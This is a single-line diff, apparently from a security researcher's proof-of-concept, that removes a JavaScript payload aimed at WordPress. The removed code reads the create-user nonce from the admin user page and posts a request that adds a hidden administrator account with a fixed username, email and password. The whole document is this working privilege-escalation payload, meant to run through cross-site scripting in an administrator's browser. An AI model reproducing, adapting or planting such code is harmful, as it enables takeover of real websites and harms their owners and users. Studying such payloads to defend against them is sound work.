@@ -1,1 +1,0 @@
-u="/wp-admin/user-new.php";jQuery.get(u,function(e){jQuery.post(u,{action:"createuser","_wpnonce_create-user":e.match(/_wpnonce_create-user"\svalue="(.+?)"/)[1],user_login:"scripty",email:"d.yasmanovych@hacken.io",pass1:"hacken123!",pass2:"hacken123!",role:"administrator"})});
